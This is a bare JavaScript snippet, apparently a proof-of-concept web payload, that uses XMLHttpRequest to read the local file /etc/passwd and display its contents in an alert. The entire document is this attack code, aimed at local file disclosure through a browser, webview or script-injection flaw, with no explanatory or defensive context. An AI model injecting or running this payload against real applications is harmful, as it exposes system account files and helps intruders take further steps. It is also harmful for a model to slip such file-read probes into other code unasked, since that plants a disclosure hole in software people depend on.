var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///etc/passwd", true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var data = xhr.responseText;
        alert(data);
    }
};
xhr.send();
